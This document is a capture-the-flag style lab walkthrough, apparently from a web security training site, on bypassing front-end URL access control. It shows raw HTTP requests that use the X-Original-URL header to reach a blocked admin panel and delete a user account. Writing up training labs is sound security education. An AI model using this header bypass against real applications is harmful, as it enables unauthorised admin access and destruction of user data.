## URL-based access control can be circumvented

This website has an unauthenticated admin panel at /admin, but a front-end system has been configured to block external access to that path. However, the back-end application is built on a framework that supports the X-Original-URL header.

To solve the lab, access the admin panel and delete the user carlos.

## Notes

- /admin
- /login

## Resume

1. Capture a **GET** request on `/`
2. Add the `X-Original-URL` to the request
3. Delete Carlos account


## Solve 

Capture a **GET** request on `/` : 

```
GET / HTTP/2
Host: 0a7400b7032fb3678067307d002a0016.web-security-academy.net
Cookie: session=k56AEOiDO5CKkqtxwMpTwTZSlGAJm7Xy
Cache-Control: max-age=0
Sec-Ch-Ua: "Not-A.Brand";v="24", "Chromium";v="146"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: fr-FR,fr;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a7400b7032fb3678067307d002a0016.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
```

Add the `X-Original-URL` to the request and try to access/see the `/admin`

```
GET / HTTP/2
Host: 0a7400b7032fb3678067307d002a0016.web-security-academy.net
Cookie: session=k56AEOiDO5CKkqtxwMpTwTZSlGAJm7Xy
Cache-Control: max-age=0
Sec-Ch-Ua: "Not-A.Brand";v="24", "Chromium";v="146"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: fr-FR,fr;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a7400b7032fb3678067307d002a0016.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
X-Original-Url: /admin/
```

The answer : 

```
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
Cache-Control: no-cache
X-Frame-Options: SAMEORIGIN
Content-Length: 3218

<section>
                        <h1>Users</h1>
                        <div>
                            <span>wiener - </span>
                            <a href="/admin/delete?username=wiener">Delete</a>
                        </div>
                        <div>
                            <span>carlos - </span>
                            <a href="/admin/delete?username=carlos">Delete</a>
                        </div>
```

Update the request to delete Carlos's account : 

```
GET /?username=carlos HTTP/2
Host: 0a7400b7032fb3678067307d002a0016.web-security-academy.net
Cookie: session=k56AEOiDO5CKkqtxwMpTwTZSlGAJm7Xy
Cache-Control: max-age=0
Sec-Ch-Ua: "Not-A.Brand";v="24", "Chromium";v="146"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: fr-FR,fr;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a7400b7032fb3678067307d002a0016.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
X-Original-Url: /admin/delete
```